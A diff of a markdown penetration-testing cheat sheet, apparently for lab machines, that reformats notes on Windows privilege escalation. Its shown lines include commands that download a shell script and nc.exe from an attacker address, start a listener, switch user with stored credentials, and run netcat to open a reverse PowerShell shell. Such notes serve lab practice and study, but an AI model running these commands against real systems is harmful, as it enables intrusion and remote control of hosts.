@@ -59,7 +59,8 @@ PS> Invoke-WebRequest http://10.10.15.15/shell.ps1 -OutFile c:\shell.ps1
 Start Listerner > nc -lvnp 4444
 If reverse shell does not connect -Verify if target machine has AV as it may delete the netcat.
 ```
-**Switch User in Powershell (Like Su user in Linux but in windows its tricky)
+
+**Switch User in Powershell (Like Su user in Linux but in windows its tricky)**
 
 ```
 PS>$user = 'WORKGROUP\Miracle' 
@@ -68,7 +69,7 @@ PS>$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
 PS>$cred = new-object system.management.automation.PSCredential $user,$secpass 
 PS>Invoke-Command -computername 127.0.0.1 -ScriptBlock { whoami } -credential $cred
 ```
-It will print Usernmae WORKGROUP\Miracle because of this { whoami }, Then to get reverse shell use below lines and remember to change the 'Ip' & 'Port'
+*It will print Usernmae WORKGROUP\Miracle because of this { whoami }, Then to get reverse shell use below lines and remember to change the 'Ip' & 'Port'*
 ```
 PS>Invoke-Command -computername 127.0.0.1 -ScriptBlock { wget http://10.10.14.201/nc.exe -OutFile C:\temp\nc.exe } -credential $cred
 PS>Invoke-Command -computername 127.0.0.1 -ScriptBlock { C:\temp\nc.exe 10.10.14.201 8687 -e powershell.exe } -credential $cred
